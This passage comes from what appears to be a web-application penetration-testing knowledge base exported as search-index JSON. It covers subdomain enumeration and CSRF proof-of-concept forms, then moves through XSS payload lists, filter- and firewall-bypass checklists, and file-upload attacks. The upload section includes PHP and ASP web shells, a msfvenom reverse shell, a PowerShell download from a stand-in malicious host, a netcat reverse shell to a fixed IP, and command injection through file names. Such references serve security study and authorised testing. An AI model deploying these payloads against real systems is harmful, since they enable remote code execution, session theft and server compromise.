Increased risk due to shared resources. Vulnerabilities in one site can affect others. Virtual Private Server (VPS) Dedicated virtual resources on a server. Better isolation than shared hosting, but vulnerable to host system attacks. Dedicated Server Exclusive server for a single client's website. Most control and isolation, minimizing cross-site contamination risk. Cloud Hosting Distributed resources across multiple servers in a cloud. Improved reliability due to redundancy, but misconfigurations can lead to unauthorized access. Managed Hosting Security and server management by the hosting provider. Less administrative work, depends on the provider\u2019s security practices."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Subdomain-Enumeration/","title":"Subdomain Enumeration","text":""},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Subdomain-Enumeration/#importance-of-subdomains-in-web-reconnaissance","title":"Importance of Subdomains in Web Reconnaissance","text":"<p>Subdomains are crucial targets in web reconnaissance because they often reveal overlooked and potentially vulnerable parts of an organization's infrastructure. Here's why they're important:</p> Aspect Details Development and Staging Subdomains used to test new features or updates before deploying them to the main site. These environments sometimes contain vulnerabilities or expose sensitive information due to relaxed security measures. Hidden Login Portals Subdomains hosting administrative panels or other login pages not meant to be publicly accessible. Attacker seeking unauthorized access can find these as attractive targets. Legacy Applications Older, forgotten web applications residing on subdomains, potentially containing outdated software with known vulnerabilities. Sensitive Information Subdomains inadvertently exposing confidential documents, internal data, or configuration files that could be valuable to attacker."},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Subdomain-Enumeration/#active-subdomain-enumeration","title":"Active Subdomain Enumeration","text":"<p>Active subdomain enumeration involves directly interacting with the target to discover subdomains. Here are some of the most effective methods and their commands:</p> Method Command Fuzzing with wfuzz <code>wfuzz -u http://10.10.11.177 -H \"Host: FUZZ.hackfa.st\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1131</code> Fuzzing with FFUF <code>ffuf -u http://10.10.11.251 -H \"Host: FUZZ.hackfa.st\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac</code> Virtual Host Scanning <code>gobuster vhost -u https://[DOMAIN-NAME] -w subdomains.txt</code> DNS Zone Transfers <code>dig @ns.example.com domain.com AXFR</code> <code>host -t axfr domain.com ns.example.com</code> DNS Brute Forcing <code>dnsmap [DOMAIN-NAME] -r report.txt</code> <code>fierce --domain [DOMAIN-NAME]</code> DNS Zone Transfer <code>dig @[DNS-SERVER] [DOMAIN-NAME] AXFR</code> Content Discovery Tools <code>Burp Suite</code> -&gt; <code>Target</code> -&gt; <code>Site map</code> -&gt; <code>Right-click</code> -&gt; <code>Passively scan this host</code>"},{"location":"Offensive-Security/Web-Application/Web-Enumeration/Subdomain-Enumeration/#passive-subdomain-enumeration","title":"Passive Subdomain Enumeration","text":"<p>Passive subdomain enumeration leverages external data sources to identify subdomains without directly interacting with the target. Here are some effective methods and their commands:</p> Method Command Certificate Transparency <code>curl -s \"https://crt.sh/?q=$[DOMAIN-NAME]&amp;output=json\" \\| jq -r '.[] \\| \"\\(.name_value)\\n\\(.common_name)\"' \\| sort -u</code> Search Engines <code>theHarvester -d [DOMAIN-NAME] -b google</code> <code>theHarvester -d [DOMAIN-NAME] -b bing -l 500</code> DNS Enumeration Scripts <code>dnsenum --enum [DOMAIN-NAME]</code> <code>nmap --script dns-brute --script-args dns-brute.domain=[DOMAIN-NAME]</code> APIs for DNS Data <code>curl -s \"https://api.securitytrails.com/v1/domain/domain.com/subdomains\" -H \"APIKEY: APIKEYHERE\"</code> <code>curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?apikey=[APIKEY]&amp;domain=[DOMAIN-NAME]\"</code>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Readme/","title":"Readme","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Readme/#do-things-the-website-isnt-expecting","title":"Do things the website isn\u2019t expecting","text":"Strategy Description Unexpected Inputs Enter special characters, long strings, and non-alphanumeric symbols into input fields to uncover injection flaws and overflow issues. Parameter Tampering Modify URL parameters and hidden form fields to test the application\u2019s handling of unexpected values. Boundary Testing Input extreme values and unexpected data types to test for overflows and type mismatches. Forced Browsing Attempt to access restricted pages by guessing URLs and using automated tools to brute-force paths. HTTP Method Manipulation Use and test endpoints with different or unexpected HTTP methods to discover hidden functionalities or vulnerabilities. Session Fixation Manipulate and attempt to reuse session tokens to test if the application properly invalidates old sessions and prevents session hijacking."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Readme/#tips-for-setting-clear-objectives","title":"Tips for setting clear objectives","text":"Tip Description Be Specific Clearly define what aspect of the application you are testing and what vulnerabilities you are looking for. Example Goal Focus on testing feature X for SQL Injection vulnerabilities for the next 4 hours to ensure efficient and focused testing. Time-Boxing Allocate a specific amount of time for each objective to maintain focus and productivity. Document Findings Keep detailed notes on what was tested, how it was tested, and any findings or potential vulnerabilities."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Readme/#stay-updated-on-latest-exploits","title":"Stay updated on latest exploits","text":"Resource Description Cybersecurity News Sites Follow reputable sites like TheHackerNews, KrebsonSecurity, BleepingComputer, and ItSecurityGuru. Forums and Communities Join forums such as Reddit\u2019s <code>r/Hacking</code>, <code>r/netsec</code>, <code>r/HowToHack</code>, Information Security Stack Exchange, and OWASP. Conferences and Workshops Attend cybersecurity conferences like <code>DEF CON</code> and <code>BlackHat</code>, or watch recorded sessions on YouTube to learn about the latest attack strategies. Social Media Follow security experts and organizations on Twitter and LinkedIn for real-time updates and insights."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/","title":"Cross Site Request Forgery (CSRF)","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#introduction","title":"Introduction","text":"<p>Cross-Site Request Forgery (CSRF) is a\u00a0 vulnerability where attacker trick user into performing actions on a web application where they are authenticated, without their knowledge. This can compromise the security of user data and account settings. CSRF is commonly mitigated by using tokens and modern browser security features.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#common-attack-scenarios","title":"Common Attack Scenarios:","text":"<ol> <li>Removing Anti-CSRF Tokens: Attacker manipulate form data to either remove or alter the anti-CSRF tokens, which are intended to prevent unauthorized actions.</li> <li>Spoofing Tokens: If a backend system fails to verify the integrity of a CSRF token properly, attacker may slightly modify the token to bypass security checks.</li> <li>Exploiting Static Token Segments: Attacker take advantage of CSRF tokens that contain predictable or unchanging parts, using these segments to fool the validation process.</li> <li>Reusing CSRF Tokens: Attacker may capture valid CSRF tokens from legitimate requests and reuse them in unauthorized requests to mimic authentic interactions.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#simple-get-request","title":"Simple GET Request","text":"<pre><code>&lt;!-- Direct user interaction required --&gt;\n&lt;a href=\"http://[DOMAIN_NAME]/endpoint?parameter=CSRFd\"&gt;Click here to view!&lt;/a&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#get-request-without-user-interaction","title":"GET Request Without User Interaction","text":"<pre><code>&lt;!-- Automatically triggers when the page loads --&gt;\n&lt;img src=\"http://[DOMAIN_NAME]/endpoint?parameter=CSRFd\" alt=\"img\"&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#simple-post-request","title":"Simple POST Request","text":"<pre><code>&lt;!-- User must click the submit button --&gt;\n&lt;form action=\"http://[DOMAIN_NAME]/endpoint\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"parameter\" value=\"CSRFd\"&gt;\n  &lt;input type=\"submit\" value=\"Submit Request\"&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#post-request-without-user-interaction","title":"POST Request Without User Interaction","text":"<pre><code>&lt;!-- Automatically submits on page load --&gt;\n&lt;form id=\"autosubmit\" action=\"http://[DOMAIN_NAME]/endpoint\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"parameter\" value=\"CSRFd\"&gt;\n  &lt;input type=\"submit\" value=\"Submit Request\"&gt;\n&lt;/form&gt;\n&lt;script&gt;\n  document.getElementById('autosubmit').submit();\n&lt;/script&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#json-get-request","title":"JSON GET Request","text":"<pre><code>&lt;!-- Can be detected and blocked by modern browsers due to CORS policy --&gt;\n&lt;script&gt;\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"http://[DOMAIN_NAME]/endpoint\");\n  xhr.send();\n&lt;/script&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#json-post-request","title":"JSON POST Request","text":"<pre><code>&lt;!-- Using JSON to send data in a POST request --&gt;\n&lt;script&gt;\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"POST\", \"http://[DOMAIN_NAME]/endpoint\");\n  xhr.setRequestHeader(\"Content-Type\", \"application/json\");\n  xhr.send(JSON.stringify({parameter: \"CSRFd\"}));\n&lt;/script&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/CSRF/#csrf-with-json-without-user-interaction","title":"CSRF with JSON Without User Interaction","text":"<pre><code>&lt;body onload='document.forms[0].submit()'&gt;\n&lt;form action=\"https://[DOMAIN_NAME]?_method=PUT\" method=\"POST\" enctype=\"application/json\"&gt;\n  &lt;input type=\"hidden\" name='data' value='{\"parameter\":\"newValue\"}'&gt;\n  &lt;input type=\"submit\" value=\"Send\"&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/","title":"Cross-Site Scripting (XSS)","text":"<pre><code>sequenceDiagram\n    participant A as Attacker\n    participant B as Web Application\n    participant C as Database\n    participant U as User\n\n    A-&gt;&gt;B: 1. Identifies Vulnerable Web App\n    A-&gt;&gt;B: 2. Injects Malicious Script via Input\n    B-&gt;&gt;C: 3. Stores Script in Database\n    C-&gt;&gt;B: 4. Retrieves Script on Request\n    B-&gt;&gt;U: 5. Serves Page with Script\n    U-&gt;&gt;U: 6. Executes Script (Browser)\n    U-&gt;&gt;A: 7. Script Sends Data to Attacker</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#raw-html-injection-context-based-injection","title":"Raw HTML Injection (Context-Based Injection)","text":"<ol> <li>Create New HTML Tags:     You can create new tags <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>?</li> <li>Use Event Handlers:     Use attributes that support the <code>javascript:</code> protocol or event handlers like <code>onload</code>, <code>onerror</code>.</li> <li>Client-Side Template Injection:     Check if any JS engine (AngularJS, VueJS, etc.) processes the HTML content.</li> <li>Scriptless Injection      If you can\u2019t create executable HTML tags, consider Dangling Markup.</li> <li>Bypass Protections     Use various encoding techniques to bypass filters and protections.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#example-payloads","title":"Example Payloads:","text":"<ol> <li>Basic Payload:      <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li> <li>Image Payload:      <code>&lt;img src=x onerror=alert(1)&gt;</code></li> <li>SVG Payload:      <code>&lt;svg onload=alert('XSS')&gt;</code></li> <li>Iframe Payload:      <code>&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;</code></li> <li>Event Handler:      <code>&lt;img src=x onerror=alert(1)&gt;</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#inside-html-attributes-context-based-injection","title":"Inside HTML Attributes (Context-Based Injection)","text":"<ol> <li>Escape to Raw HTML:     Try to escape out of the attribute context using <code>\"&gt;</code>.</li> <li>Inject New Events/Attributes:     Inject new events or attributes that support JavaScript execution.</li> <li>Bypass Protections:     Use various encoding techniques to bypass filters and protections.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#example-payloads_1","title":"Example Payloads:","text":"<ol> <li>Attribute Escape:      <code>\"&gt;&lt;img src=x onerror=alert(1)&gt;</code></li> <li>Event Injection:      <code>\" autofocus onfocus=alert(1) x=\"</code></li> <li>Protocol Injection:      <code>href=\"javascript:alert(1)\"</code></li> <li>HTML Entity Encoding:      <code>&lt;a href=\"javascript:var a='&amp;apos;-alert(1)-&amp;apos;'\"&gt;a&lt;/a&gt;</code></li> <li>Unicode Encoding:  <code>&lt;img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)&gt;</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#inside-javascript-code-context-based-injection","title":"Inside JavaScript Code (Context-Based Injection)","text":"<ol> <li>Escape the Tag:      Inject <code>&lt;/script&gt;</code> to escape the script context.</li> <li>Escape String Context:     Use techniques to break out of string literals and execute arbitrary JS code.</li> <li>Template Literals:     Utilize <code>${ ... }</code> syntax to inject JS expressions inside template literals.</li> <li>Bypass Protections:     Use various encoding methods to bypass protections.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#example-payloads_2","title":"Example Payloads:","text":"<ol> <li>Escape Script Tag:      <code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;</code></li> <li>Escape String Context:      <code>'-alert(document.domain)-'</code></li> <li>Template Literals:      <code>${alert(1)}</code></li> <li>Unicode Encoding:      <code>&lt;script&gt;\\u0061lert(1)&lt;/script&gt;</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#javascript-function-execution","title":"JavaScript Function Execution","text":"<ol> <li>Function Parameter Injection:     Indicate the name of the function to execute via a parameter, e.g., <code>?callback=alert(1)</code>.</li> <li>DOM XSS Exploitation:     Pay attention to how your input is controlled and if it is used by any sink functions.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#reflection-scenarios-debugging-client-side-js","title":"Reflection Scenarios (Debugging Client-Side JS)","text":"<ol> <li>Intermediately Reflected:     If the value of a parameter or path is reflected on the web page, you could exploit Reflected XSS.</li> <li>Stored and Reflected:     If a value controlled by you is saved on the server and reflected every time you access a page, you could exploit Stored XSS.</li> <li>Accessed via JS:     If a value controlled by you is accessed using JavaScript, you could exploit DOM XSS.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#contexts-for-xss-exploits-debugging-client-side-js","title":"Contexts for XSS Exploits (Debugging Client-Side JS)","text":"<ol> <li>Raw HTML:     Reflecting input in raw HTML allows you to use tags like <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;script&gt;</code> to execute JS.</li> <li>Inside HTML Tags Attribute:     Escaping from attributes or using events that support JS execution within attributes (e.g., <code>onclick</code>, <code>href=\"javascript:\"</code>).</li> <li>Inside JavaScript Code:     Escaping from <code>&lt;script&gt;</code> tags, strings, or using template literals for JS execution.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#special-scenarios-and-bypasses-debugging-client-side-js","title":"Special Scenarios and Bypasses (Debugging Client-Side JS)","text":"<ol> <li>Accessing JavaScript Functions:     Use parameters to control function execution, such as <code>?callback=alert(1)</code>.</li> <li>Encoding Tricks:     Bypass filters using HTML encoding, Unicode encoding, URL encoding, etc.</li> <li>Special Protocols:     Use <code>javascript:</code> or <code>data:</code> protocols in attributes like <code>href</code> or <code>src</code>.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#advanced-techniques","title":"Advanced Techniques","text":"<ol> <li>JavaScript Hoisting: Exploit scenarios where undeclared variables or functions are used.</li> <li>CSS-Gadgets: Use CSS to manipulate element positioning and maximize the impact of XSS.</li> <li>Polyglots: Create payloads that can be executed in multiple contexts (HTML, JavaScript, etc.).</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/XSS/#bypasses-and-obfuscation","title":"Bypasses and Obfuscation","text":"<ol> <li>Random Capitalization:     Vary the capitalization of tags and attributes (e.g., <code>&lt;sCrIpT&gt;</code>).</li> <li>Double Tag Injection:     Use double tags to bypass single tag filters (e.g., <code>&lt;script&gt;&lt;script&gt;</code>).</li> <li>Unexpected Parent Tags:      Use unexpected parent tags like <code>&lt;svg&gt;&lt;x&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/x&gt;&lt;/svg&gt;</code>.</li> <li>Unicode and HTML Encoding:     Use Unicode or HTML entities to obfuscate payloads (e.g., <code>\\u0061lert(1)</code>, <code>&amp;apos;-alert(1)-&amp;apos;</code>).</li> </ol> <p>XSS Training and Testing Platform</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/Checklist/CSRF/","title":"Cross Site Request Forgery (CSRF)","text":"<ol> <li>Capture and Analyze Requests<ul> <li> Use Burp Suite or a similar tool to intercept and analyze requests to identify the presence and nature of any CSRF tokens.</li> <li> Document the structure of requests and identify where the CSRF token is located (e.g., in <code>headers</code>, <code>cookies</code>, or request bodies).</li> </ul> </li> <li>Token Predictability and Strength<ul> <li> Evaluate if the CSRF tokens are predictable or easily guessable by analyzing their patterns.</li> <li> Check the entropy and randomness of the CSRF tokens. Low entropy might indicate weak tokens.</li> </ul> </li> <li>Header-Based Token Manipulation<ul> <li> If the CSRF token is included in a header, temporarily remove it from the request to see if the request is still processed.</li> <li> Modify the token value within the header to see if the application properly validates it.</li> </ul> </li> <li>Body-Based Token Manipulation<ul> <li> For tokens included in the request body, remove the value of the CSRF token parameter and see if the request succeeds.</li> <li> Remove both the CSRF token parameter and its value to test if the request is still valid without it.</li> </ul> </li> <li>Cross-User Token Reuse<ul> <li> Test if the same CSRF token is reused across different user accounts, which would indicate poor token management.</li> </ul> </li> <li>Token Substitution<ul> <li> Replace the CSRF token with a different value of the same length to check if the application validates the token correctly.</li> </ul> </li> <li>Method Manipulation<ul> <li> Modify the request method from <code>POST</code> to <code>GET</code> and remove the CSRF token to see if the application still processes the request.</li> <li> For <code>PUT</code> or <code>PATCH</code> requests, append the <code>_method</code> parameter to the request body to emulate a different request method and test CSRF protection.</li> </ul> </li> <li>Content-Type Handling<ul> <li> Test if the application accepts different content types (e.g., <code>application/x-www-form-urlencoded</code>, <code>text/plain</code>). Modify the request body accordingly and observe the response.</li> <li> Test with multipart/form-data content type to see if the application processes requests correctly.</li> </ul> </li> <li>Referer Validation Bypass<ul> <li> Include the following code in your CSRF PoC HTML file to bypass Referer validation: <code>&lt;meta name=\"referrer\" content=\"never\"&gt;</code></li> <li> Test using a custom Referer header value to check if the application relies solely on Referer headers for CSRF protection.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Client-Side-Injections/Checklist/XSS/","title":"Cross-Site Scripting (XSS)","text":"<ol> <li> <p>Basic XSS Testing</p> <ul> <li> Try XSS using QuickXSS tool by theinfosecguy.</li> <li> Upload file using <code>'&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</code>.</li> <li> If script tags are banned, use <code>&lt;h1&gt;</code> and other HTML tags.</li> <li> If output is reflected back inside the JavaScript as a value of any variable, use <code>alert(1)</code>.</li> <li> If double quotes (\") are filtered, use this payload: <code>/&gt;&lt;img src=d onerror=confirm(/tushar/);&gt;</code>.</li> <li> Upload a JavaScript payload using an image file.</li> <li> Change method from POST to GET to bypass filters sometimes.</li> </ul> </li> <li> <p>Tag Attribute Value</p> <ul> <li> If input lands in an attribute value (e.g., <code>&lt;input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\"&gt;</code>), insert payload like <code>\" onfocus=\"alert(document.cookie)\"</code>.</li> </ul> </li> <li> <p>Syntax Encoding</p> <ul> <li> Encode payload as <code>%3cscript%3ealert(document.cookie)%3c/script%3e</code>.</li> </ul> </li> <li> <p>XSS Filter Evasion</p> <ul> <li> Replace <code>&lt;</code> and <code>&gt;</code> with HTML entities <code>&amp;lt;</code> and <code>&amp;gt;</code>.</li> <li> Use an XSS polyglot, e.g., <code>javascript:/*-&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code>.</li> </ul> </li> <li> <p>XSS Firewall Bypass</p> <ul> <li> Check if the firewall blocks only lowercase characters.</li> <li> Break firewall regex with a new line (<code>\\r\\n</code>).</li> <li> Try double encoding.</li> <li> Test for recursive filters.</li> <li> Inject anchor tags without whitespace.</li> <li> Bypass whitespaces using bullets.</li> <li> Change the request method.</li> </ul> </li> <li> <p>Test For Reflected Cross Site Scripting</p> <ul> <li> Verify characters <code>&lt;</code>, <code>&gt;</code>, <code>''</code>, <code>&amp;</code>, and <code>\"\"</code> are filtered.</li> <li> Test with character escape sequences.</li> <li> Replace <code>&lt;</code> and <code>&gt;</code> with HTML entities <code>&amp;lt;</code> and <code>&amp;gt;</code>.</li> <li> Test payloads with both lower and upper case.</li> <li> Break firewall regex with a new line (<code>\\r\\n</code>).</li> <li> Use double encoding.</li> <li> Test with recursive filters.</li> <li> Inject anchor tags without whitespace.</li> <li> Replace whitespace with bullets.</li> <li> Change HTTP methods.</li> </ul> </li> <li> <p>Test For Stored Cross Site Scripting</p> <ul> <li> Identify stored input parameters that reflect on the client-side.</li> <li> Look for input parameters on the profile page.</li> <li> Look for input parameters on the shopping cart page.</li> <li> Look for input parameters on the file upload page.</li> <li> Look for input parameters on the settings page.</li> <li> Look for input parameters on the forum or comment page.</li> <li> Test uploading a file with XSS payload as its file name.</li> <li> Test with HTML tags in various input fields.</li> </ul> </li> <li> <p>Advanced XSS Testing</p> <ul> <li> Test for DOM-based XSS by examining JavaScript code handling user input.</li> <li> Check for XSS in third-party widgets and plugins.</li> <li> Test XSS in email fields by injecting payloads that can be executed in email clients.</li> <li> Test for XSS in mobile applications using WebView.</li> <li> Verify if Content Security Policy (CSP) headers are in place and effective.</li> <li> Use CSP bypass techniques where CSP is implemented but not correctly configured.</li> <li> Test for XSS via JSONP endpoints.</li> <li> Check if XSS can be triggered in different browser contexts (e.g., Chrome, Firefox, Edge).</li> <li> Test for reflected and stored XSS in multi-step forms and wizards.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/","title":"File Upload","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#introduction","title":"Introduction","text":"<p>File Upload vulnerabilities occur when a web application file upload feature lacks robust validation, allowing attacker to upload harmful files. These files can execute malicious scripts or malware on the server, leading to unauthorized access or data breaches.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#impact-of-file-upload-vulnerabilities","title":"Impact of File Upload Vulnerabilities","text":"<p>The potential consequences of file upload vulnerabilities can vary greatly depending on the application\u2019s code, the web server\u2019s configuration, and the underlying operating system. The specific impact is highly influenced by how these elements are set up. Let's explore some common exploit scenarios, along with the conditions that could enable them:</p> Impact Description Remote Code Execution (RCE) One of the most severe outcomes. Attacker can upload malicious files, such as web shells, granting them the ability to execute terminal commands on the server directly through a browser. Denial of Service (DoS) If file size or quantity restrictions aren't enforced, attacker can overwhelm the server by uploading excessive files, consuming all available storage and rendering the application unusable. Web Defacement If root directory permissions are improperly configured, attacker can overwrite legitimate website content, altering the appearance or functionality of the website. Phishing Pages Attacker could modify existing pages to collect sensitive user information, redirecting the data to an external server under their control, often used for phishing attacks."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#one-line-shell-payloads","title":"One-Line Shell Payloads","text":"<ol> <li>Basic PHP Execution: Executes a command passed via the x parameter. <code>&lt;?='$_GET[x]'?&gt;</code></li> <li>Basic PHP File Read: Displays the contents of the /etc/passwd file. <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code></li> <li>Basic PHP Command: Executes the hostname command on the server. <code>&lt;?php echo system('hostname'); ?&gt;</code></li> <li>PHP Web Shell: Enables dynamic command execution via a web interface, accepting commands via the 'cmd' parameter. <code>&lt;?php if(isset($_REQUEST['cmd'])){ echo \"&lt;pre&gt;\"; system($_REQUEST['cmd']); echo \"&lt;/pre&gt;\"; } ?&gt;</code></li> <li>Basic ASP Web Shell: Executes commands on an ASP server using the <code>cmd</code> query parameter. <code>&lt;% eval request(\"cmd\") %&gt;</code></li> <li>PHP Reverse Shell:Generates a PHP script for establishing a reverse shell connection. <code>msfvenom -p php/reverse_php LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw &gt; reverse.php</code></li> <li>PowerShell Web Shell: Uses PHP to invoke PowerShell for downloading and executing a remote script. <code>&lt;?php echo shell_exec('powershell.exe -command \"Invoke-WebRequest -Uri http://malicious.site/shell.ps1\"'); ?&gt;</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#magic-byte-forgery","title":"Magic Byte Forgery","text":"<p>When an application uses a file's magic bytes to determine its content type, such as through PHP's mime_content_type function, security measures can be circumvented by forging the magic bytes of a permitted file type. For instance, if the application allows GIF images, we can manipulate the file's magic bytes to match those of a GIF (e.g., GIF89a) to trick the server into accepting it as a legitimate GIF file. This technique can be applied to various file types, as illustrated below:</p> File Type Magic Bytes GIF <code>GIF89a;\\x0a</code> PDF <code>%PDF-</code> JPG / JPEG <code>\\xFF\\xD8\\xFF\\xDB</code> PNG <code>\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A</code> TAR <code>\\x75\\x73\\x74\\x61\\x72\\x00\\x30\\x30</code> XML <code>&lt;?xml</code>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#rce-via-the-file-name-parameter","title":"RCE via the File Name Parameter","text":"<p>If the application includes custom image processing / file manipulation, then it may be vulnerable to remote command execution via code injection in the file name. Some example valid file names that could trigger commmand injection are the following:</p> File Name Payload Outcome <code>a$(whoami)z.jpg</code> <code>$(whoami)</code> a[CURRENT USER]z.jpg <code>a;sleep 30;z.jpg</code> <code>;sleep 30;</code> The application will take 30+ seconds to respond <code>a$(id)z.jpg</code> <code>$(id)</code> a[USER ID INFORMATION]z.jpg <code>a$(cat /etc/passwd)z.jpg</code> <code>$(cat /etc/passwd)</code> a[CONTENTS OF /etc/passwd]z.jpg"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#uploading-a-htaccess-file-apache-only","title":"Uploading a .htaccess File (Apache Only)","text":"<p>Developers and security teams often blacklist specific file extensions but may overlook web server configuration files, making the .htaccess technique particularly dangerous and potentially capable of leading to Remote Code Execution (RCE).</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#how-it-works","title":"How it works","text":"<ol> <li> <p>Upload the .htaccess File: The attacker uploads the malicious .htaccess file to a directory on the server. <code>AddType application/x-httpd-php .evil</code></p> </li> <li> <p>File Extension Handling: The .htaccess file redefines how the server processes files with the .evil extension, treating them as PHP scripts.</p> </li> <li> <p>Execute Malicious Code: The attacker can then upload files with the .evil extension containing malicious PHP code, which the server will execute.you can use https://github.com/WhiteWinterWolf/wwwolf-php-webshell then upload nc and run it with <code>.\\nc.exe 192.168.36.128 9001 -e cmd.exe</code></p> </li> <li> <p>This technique depends on the following options being enabled (NGINX does not support .htaccess files, so this method applies only to Apache servers.):</p> <pre><code>/etc/apache2/apache2.conf:      AllowOverride Options\n/etc/apache2/apache2.conf:      AllowOverride FileInfo\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#file-bypassing-techniques","title":"File Bypassing Techniques","text":"<p>Explore methods to navigate through strict upload filters and security mechanisms:</p> Technique Description Null byte (\\x00) injection The null byte (\\x00) is a control character used to signify the end of a string. Attacker can bypass file extension checks by appending <code>%00</code> to a filename (e.g., <code>shell.jpeg%00.php</code>), tricking the server into accepting disallowed extensions. Multi-dot extension bypass Attacker can bypass file extension restrictions by using multiple dots in a filename (e.g., <code>evil.php....jpg</code>), causing the server to misinterpret the file's actual extension. Case Sensitivity Exploitation Attacker can exploit case sensitivity by changing the extension's case (e.g., <code>shell.php</code> becomes <code>shell.pHP</code>), potentially bypassing security filters that only check for lowercase extensions. Special Character Embedding Attacker can embed special characters in filenames (e.g., <code>file.php#?.jpg</code>) to confuse file handling mechanisms and bypass security checks. Right to left override (rtlo) Attacker can use the RTLO character to reverse the order of characters in a filename (e.g., <code>filenamegpj.exe</code>), disguising the true file type. Content-type Duplication Attacker can duplicate <code>Content-Type</code> headers in HTTP requests to bypass content-type restrictions and trick servers into processing malicious files. Unicode and url Encoding Attacker can use Unicode and URL encoding to obfuscate filenames (e.g., <code>file%20name.php</code>), making it harder for security mechanisms to detect malicious files. Advanced mime Manipulation Attacker can set the <code>Content-Type</code> header to <code>application/octet-stream</code> to disguise the file type and bypass content-type based security checks. Hybrid file techniques Attacker can create hybrid files containing both valid content and executable code (e.g., <code>evil.jpg&lt;?php echo $_GET['cmd']; ?&gt;</code>), which can be interpreted differently by various applications. Deceptive path insertion Attacker can insert deceptive paths in filenames (e.g., <code>file.php/.jpg</code>) to mislead file handling mechanisms and bypass security checks. Mime type spoofing Attacker can upload a malicious PHP file 